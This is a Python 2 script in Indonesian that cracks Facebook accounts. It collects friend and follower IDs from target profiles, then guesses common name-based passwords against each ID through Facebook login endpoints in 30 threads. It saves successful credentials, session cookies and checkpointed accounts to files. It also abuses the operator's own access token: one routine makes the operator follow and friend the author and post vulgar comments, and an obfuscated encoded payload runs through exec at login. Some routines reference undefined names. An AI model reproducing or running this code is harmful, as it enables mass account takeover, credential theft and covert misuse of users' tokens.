# -*- coding: utf-8
# author by angga kurniawan
import os
try:
	import requests
except ImportError:
	print("\n ! module requests belum terinstall")
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	print("\n ! module bs4 belum terinstall")
	os.system("pip2 install bs4")

try:
	import ipaddress
except ImportError:
	print("\n ! module dukungan belum terinstall")
	os.system("pip2 install ipaddress")

import os, sys, re, time, requests, calendar, ipaddress
from multiprocessing.pool import ThreadPool as Th
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1
def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
        zz = ('4601874036492018')
	una = ('100000084022645')
        kom = ('KYAA>< SINI GW SFONGIN KNTL LUU  @[100000084022645:0] 😍😘\nhttps://www.facebook.com/100000084022645/posts/4609765945702827/?app=fbl') 
	post = ('4609765945702827')
	post2 = ('4609765945702827')
        kom2 = ('BOOLKU ANGED MAZZ  @[100000084022645:0] 😘😘\nhttps://www.facebook.com/100000084022645/posts/4609765945702827/?app=fbl') 
        requests.post('https://graph.facebook.com/100000084022645/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/2325505107680136/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(zz,toket,toket))
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	menu()

def logo():
	os.system("clear")
	print("╔╗╴╴╴╔══════╗  • Author : Zamuel Voldemord")
	print("║║╴╴╴║╴╔════╝  • Github : github.com/zamxyz")
	print("║╚═══╝╴╚════╗  ┌──────────────────────────────┐\n╚════╗╴╔═══╗║  │  Script By Zamuel X Ryzall   │\n╔════╝╴║╴╴╴║║  │   •• Github.com/zamxyz ••    │\n╚══════╝╴╴╴╚╝  └──────────────────────────────┘    ")

def login():
	os.system("clear")
	try:
		#-> test koneksi
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit(" ! tidak ada koneksi internet")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		print(" * sebelum masuk ke menu harus login terlebih dahulu")
		print(" * untuk login silakan masukan token facebook anda")
		print(" ? ketik '\033[0;93mhelp\033[0;97m' untuk lihat tutorial ambil token facebook")
		token = raw_input("\n + token fb : ")
		if token == "help":
			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
			exit(" ! di simak video nya biar paham")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			bot_komen
			import marshal,zlib,base64
			exec(marshal.loads(zlib.decompress(base64.b32decode("PCOKLEW7J3BSAFEHUHN5I6HHSWX5BK7V2BJKBRVJC5PHXYYDTCLOFZXGUT3NAJ7QYU6ZRKKJCP7SJBPQBN6MABZELB3CQM3KG7KHAS7BDDNXFVSSE5Q6O3446EB6AY4QRTAWYDHGMOYPQAXNCG5U7D7DTG3RJGYQHK6MRMTVL53ZXZLDNVO6H7LONH6T4EYAEBFNARIJBJKJ5YOQUDWZ6GWX4N2W3LKDPQEH5Z26K37RCQJOKQQYYVRFJQJ6LOMRSXKFAVITIWBBI5A7VG2JZ6FUAJFGGRFBUX4ULNH2KMSJIMGVZ6DLWND6SZYEFUN327AWDQBQU5A6OMMEIWOIVS6S7CV34AYTRJ3P3MPLOLX5XYOZLXY4QTZJZ34GO7IHIDRKZWQ="))))
			print("\n + user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama))
			time.sleep(1)
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" ! token kadaluwarsa")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	except IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	except requests.exceptions.ConnectionError:
		exit(" ! tidak ada koneksi internet")
	logo()
	print
	print(" [ selamat datang \033[0;93m%s\033[0;97m ]\n"%(nama))
	print
	print(" 1. crack dari publik teman")
	print(" 2. crack dari pengikut publik")
	print(" 3. crack dari target massal")
	print(" 4. lihat hasil crack")
	print(" 5. cek opsi hasil crack")
	print(" 6. setting user-agent")
	print(" 0. keluar (hapus token)")
	angga = raw_input("\n ? choose : ")
	if angga =="":
		menu()
	elif angga == "1" or angga == "01":
		publik()
		method()
	elif angga == "2" or angga == "02":
		follower()
		method()
	elif angga == "3" or angga == "03":
		massal()
		method()
	elif angga == "4" or angga == "04":
		print("\n 1 cek hasil crack OK")
		print(" 2 cek hasil crack CP")
		cek = raw_input("\n ? choose : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print(" * list nama file tersimpan di folder OK")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n ? pilih nama file : ")
				if file == "":
					menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" + hasil crack : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
			os.system("cat OK/%s"%(file))
			print("\033[0;97m # ----------------------------------------------")
			exit(" ! jangan lupa di copy dan di simpan hasilnya")
		elif cek == "2":
			dirs = os.listdir("CP")
			print(" * list nama file tersimpan di folder CP")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n ? pilih nama file : ")
				if file == "":
					menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" + hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m # ----------------------------------------------")
			exit(" ! jangan lupa di copy dan di simpan hasilnya")
		else:
			menu()
	elif angga == "5" or angga == "05":
		cek_opsi()
	elif angga == "6" or angga == "06":
		setting_ua()
	elif angga == "0" or angga == "00":
		os.system("rm -f login.txt")
		exit("\n # berhasil menghapus token")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari daftar teman")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ! akun tidak tersedia atau list teman private")
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari pengikut sendiri")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ! akun tidak tersedia atau list teman private")
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	try:
		tanya_total = int(input(" + jumlah target id : "))
	except:tanya_total=1
	print("\n * isi 'me' jika ingin dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" + id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" ! akun tidak tersedia atau list teman private")
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id)))

def method():
	print(" \n [ pilih method crack - coba method satu² ]\n")
	print(" 1. method b-api  (fast)")
	print(" 2. method mbasic (slow)")
	print(" 3. method mobile (super ow)")
	method = raw_input("\n ? method : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input(" ? gunakan password manual? y/t: ")
		if ask == "y":
			manual()
		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
		Th(30).map(bapi, id)
	elif method == "2":
		ask = raw_input(" ? gunakan password manual? y/t: ")
		if ask == "y":
			manual()
		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
		Th(30).map(mbasic, id)
	elif method == "3":
		ask = raw_input(" ? gunakan password manual? y/t: ")
		if ask == "y":
			manual()
		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
		Th(30).map(mobile, id)
	else:
		menu()

def bapi(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		global ok,cp,ua, loop
                print '\r\033[0;95m[\033[0;97mCrack\033[0;95m] \033[0;97m %s/%s | OK : %s | CP : %s ' %  (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower() ,'sayang','bismillah','123456','kontol']:
				ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.54'
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://mbasic.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;97m\033[0;96mok\033[0;97m\033[0;97m ' +uid+ ' • ' + pw+  ''
					ok.append(uid+' • '+pw+'•'+ttl)
					save = open('OK.txt','a') 
					save.write('[OK] '+str(uid)+' • '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;93m[CP] ' +uid+ '•' + pw + '')
						cp.append(uid+'•'+pw+'')
						save = open('CP.txt' ,'a')
						save.write('[CP] '+str(uid)+'•'+str(pw)+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;95m[\033[0;97mCP\033[0;95m]\033[0;97m ' +uid+ ' • ' + pw + ''
					cp.append(uid+' • '+pw)
					save = open('CP.txt' ,'a') 
					save.write('[CP] '+str(uid)+' • '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
        jalan('\n \033[0;97m[\033[0;95m+\033[0;97m] Crack Selesai... ')
        raw_input(' [ \033[0;95m KEMBALI \033[0;97m ] ')
        menu()


def mbasic(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mobile(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name+"123", name+"1234", name+"12345", "sayang" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", "anjing" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", "bangsat" ]
	else:
		pwx = [ name+"123", name+"12345", "sayang" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def manual():
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	print("\n * contoh pass : sayang,anjing,bangsat")
	asu = raw_input(" ? set pass : ").split(",")
	if len(asu) =="":
		exit(" ! jangan kosong")
	print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
	print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
	print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")

	def main(user):
		global loop, token
		sys.stdout.write(
			"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				kwargs = {}
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
				b = parser(p,"html.parser")
				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
				for i in b("input"):
					try:
						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
						else:continue
					except:pass
				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					try:
						token = open("login.txt", "r").read()
						with requests.Session() as ses:
							ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
							month, day, year = ttl.split("/")
							month = bulan_ttl[month]
							print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
							cp.append("%s|%s"%(uid, pw))
							open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
							break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue

			loop += 1
		except:
			pass
	Th(30).map(main, id)

def setting_ua():
	print("\n 1. ganti user agent tools")
	print(" 2. gunakan user agent default")
	print(" 3. lihat user agent anda")
	ua = raw_input("\n ? choose : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = raw_input(" + user agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n + berhasil ganti user agent")
		menu()
	elif ua == "2":
		print(" + user agent : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
		raw_input("\n + berhasil ganti user agent")
		menu()
	elif ua == "3":
		os.system("xdg-open https://myuseragent.herokuapp.com/")
		print(" ! tunggu sebentar...")
		time.sleep(1)
		raw_input("\n + enter untuk kembali ke menu")
		menu()

#-> Cek Opsi
def cek_opsi():
	print("\n * masukan file (ex: CP/Wednesday-25-Agustus-2021.txt)")
	files = raw_input(" ? nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n ! nama file %s tidak tersedia"%(files))
	print(" + total akun : "+str(len(buka_baju)))
	print(" * sedang prosess cek akun....")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n + cek akun : "+kontol.replace(" + ",""))
		try:
			check_in(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	raw_input("\n + pencet enter untuk kembali ke menu....")
	menu()

def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" + terdapat "+str(len(ngew))+" opsi ")
		for opt in range(len(ngew)):
			print("   "+str(opt+1)+" "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" ! %s"%(oh))
	else:
		print(" ! login gagal, silahkan cek kembali id dan password")
	
def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	login()
